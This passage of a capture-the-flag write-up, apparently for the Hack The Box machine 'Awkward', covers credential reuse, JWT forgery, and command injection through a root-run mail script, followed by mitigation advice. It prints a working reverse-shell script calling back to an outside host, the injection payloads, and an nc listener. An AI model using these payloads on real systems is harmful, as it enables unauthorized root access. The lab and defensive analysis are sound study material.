The mail command looked interesting, but it was running as root. And at that time I was trying to get in as bean or christine. So I took a note and left it aside.

I went back to the backup and looked deeper into the hidden folders. Eventually, I came across what looked like the auto-save file for [Xpad](https://wiki.gnome.org/Apps/Xpad).

```bash
www-data@awkward:/tmp/test$ cat .config/xpad/content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
REDACTED

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
```

It contained a password and a bolded note to use it everywhere. I used it to connect to the store.

![Store](/assets/images/2023/01/Awkward/Store.png "Store")

And to SSH.

```bash
$ ssh bean@target
bean@target's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sun Oct 23 21:38:08 2022 from 10.10.14.6
bean@awkward:~$ ls -la
total 84
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 .
drwxr-xr-x  4 root root 4096 Oct  5 02:46 ..
lrwxrwxrwx  1 bean bean    9 Sep 15 21:40 .bash_history -> /dev/null
-rw-r--r--  1 bean bean  220 Sep 15 21:34 .bash_logout
-rw-r--r--  1 bean bean 3847 Sep 15 21:45 .bashrc
drwx------  9 bean bean 4096 Sep 22 14:30 .cache
drwx------ 13 bean bean 4096 Oct  6 01:35 .config
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Desktop
drwxr-xr-x  3 bean bean 4096 Sep 15 21:46 Documents
drwxr-xr-x  2 bean bean 4096 Sep 15 23:03 Downloads
drwx------  2 bean bean 4096 Sep 22 14:24 .gnupg
drwx------  3 bean bean 4096 Sep 15 21:35 .local
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Music
drwxrwxr-x  4 bean bean 4096 Oct  6 01:35 .npm
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Pictures
-rw-r--r--  1 bean bean  807 Sep 15 21:34 .profile
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Public
drwx------  4 bean bean 4096 Sep 15 21:55 snap
drwx------  2 bean bean 4096 Sep 15 21:36 .ssh
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Templates
-rw-r-----  1 root bean   33 Jan 14 23:22 user.txt
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Videos

bean@awkward:~$ cat user.txt
REDACTED
```

## Privilege Escalation

Once connected as bean, I thought I needed to find a way to access the user christine. I looked at sudo, suid, cronjobs, ... I did not find anything. 

I read the source code of the store application. It had similar code to deny the use of some characters. And it was using `sed` in the code to remove items from the cart.

I saw that I could create new products by adding files to the `product-details` folder. So I thought maybe I could inject code in there, and get it executed when `sed` was called. But the application was running as www-data, so I left that aside and looked for other things.


### Email Sending

I ran pspy again, and the process that sent the emails keep coming back.

```bash
023/01/16 00:40:01 CMD: UID=0    PID=4201   | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/01/16 00:40:01 CMD: UID=0    PID=4204   | /usr/sbin/postdrop -r 
2023/01/16 00:40:01 CMD: UID=0    PID=4203   | /usr/sbin/postdrop -r 
2023/01/16 00:40:01 CMD: UID=0    PID=4202   | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2023/01/16 00:40:01 CMD: UID=0    PID=4205   | cleanup -z -t unix -u -c 
2023/01/16 00:40:01 CMD: UID=0    PID=4206   | trivial-rewrite -n rewrite -t unix -u -c 
2023/01/16 00:40:01 CMD: UID=0    PID=4207   | /bin/bash /root/scripts/notify.sh 
2023/01/16 00:40:01 CMD: UID=0    PID=4212   | mail -s Leave Request: bean.hill christine 
2023/01/16 00:40:01 CMD: UID=0    PID=4214   | local -t unix 
2023/01/16 00:40:01 CMD: UID=0    PID=4213   | cleanup -z -t unix -u -c 
2023/01/16 00:40:01 CMD: UID=0    PID=4215   | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/01/16 00:40:01 CMD: UID=0    PID=4217   | local -t unix 
2023/01/16 00:40:01 CMD: UID=0    PID=4216   | /usr/sbin/postdrop -r 
```

It took me a while, but eventually, I realized that the subject of the email contained the username of the requester (Leave Request: bean.hill christine), and that I could control that. 

When I first got a shell on the machine, I found the `TOKEN_SECRET` that was used to generate JWT. I took my token to [jwt.io](https://jwt.io/) to confirm that it worked.

![Signature Verified](/assets/images/2023/01/Awkward/SignatureVerified.png "Signature Verified")

I tried generating a token with a fake name to see if it would be used in the mail command. I used Burp to send a leave request with my new token and checked what was executed on the server.

```bash
2023/01/16 01:02:46 CMD: UID=0    PID=4320   | mail -s Leave Request: ERIC_WAS_HERE christine
```

It worked! Next, I tried to send some code to execute. 

```json
{
  "username": [";`id`;ls"],
  "iat": 1673727191
}
```
I sent a username with some commands to execute. The `id` was run, but on insertion by www-data. Not by root when sending the email. So that did not help.

```bash
mail -s Leave Request: ;uid=33(www-data) gid=33(www-data) groups=33(www-data);ls christine
```

I needed something that would be executed by mail, not the web server. I found on GTFOBins that [mail](https://gtfobins.github.io/gtfobins/mail/#shell) could be used to run commands.

I struggled a lot to get the payload executed. In the end, I had to double-encode everything, and start with a single `"`.

I created a script on the server and made it executable. 

```bash
bean@awkward:~$ cat /tmp/test.sh
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
```

Then I sent a username that would use `--exec` on the mail command to run the script.

```json
{
  "username": ["\\\" --exec=\\\"\\!/tmp/test.sh\\\""],
  "iat": 1673727191
}
```
I sent a new request with the generated JWT and I got a hit on my listener.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.185] 35700
bash: cannot set terminal process group (946): Inappropriate ioctl for device
bash: no job control in this shell

root@awkward:~/scripts# whoami
whoami
root

root@awkward:~/scripts# cat /root/root.txt
cat /root/root.txt
REDACTED
```

After I finally got root, I realized that I could have done the same when I got the shell as www-data. The file used to store the leave requests is writable by www-data. So I could add the command to the file and get my shell.

```bash
echo ' " --exec="!/tmp/test.sh"' >> /var/www/private/leave_requests.csv
```

## Mitigations

This box was made vulnerable by a series of mistakes, mostly in the main application.

The source maps are great for developers, but they should not be available in production. They also make life easier for hackers.

The token validation was problematic. If the token was not set to `guest`, then I could access pages that should have been protected. The code should always validate the full token and reject any requests with an invalid token.

The API endpoint to check the store status had no reason to take a URL parameter. The developers should know where the store would be. If they need multiple URLs for different environments, that could be stored in an environment variable instead of allowing the users to query anything they want.

The `staff-details` endpoint was problematic. 

```js
app.get('/api/staff-details', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  connection.query(
    'SELECT * FROM users',
    function (err, results) {
      if(err) {
        return res.status(500).send("Database error")
      }
      else {
        return res.status(200).json(results)
      }
    }
  );
})
```

If `user_token` was not defined, then `authFailed` stayed false and we could access all the users. In authentication code, the default should always be a failure until proven that the authentication is successful. This way call is rejected in the case of a forgotten path like here.

Sending the data directly from the database is a bad idea. The code should go through the users and only send the fields that are needed. This way you don't risk sending sensitive data like the password hashes, even if it's added after the code was written.

The way the leave requests were stored also has issues. The code uses the command line to echo the entries in a file and read them. Passing user-supplied values to the command line is always risky. The code tries to reject some characters, but that's clearly not enough. Validating the types of the arguments would have helped. 

The application already has a database to store users. Why not use it for leave requests also? And if the requests needed to be stored in a file, why not use the Node methods to read and write to files?

Once connected, I was able to read the backup of another user. Backups can contain sensitive data and should be protected. The file should not be readable by anyone but the owner. And maybe they could be encrypted.

There was also an issue with bean's password. They entered it in a clear text document. Xpad saved it in clear. I don't know it that was an auto-save file, or where it saves all the notes, but passwords cannot be entered in an unencrypted document. And they should not be reused. 

The last problem was with the code that sent the email when a new leave request was added.

```bash
root@awkward:~/scripts# cat notify.sh
cat notify.sh
#!/bin/bash

inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv | while read; do
        change=$(tail -1 /var/www/private/leave_requests.csv)
        name=`echo $change | awk -F, '{print $1}'`
        echo -e "You have a new leave request to review!\n$change" | mail -s "Leave Request: "$name christine
```

Once again, user's data is used in a command. This code probably takes for granted that the data was sanitized by the code that wrote it to the file. But you should always sanitize the inputs where you use them. Don't trust other code to do it for you. You never know how it can be bypassed.
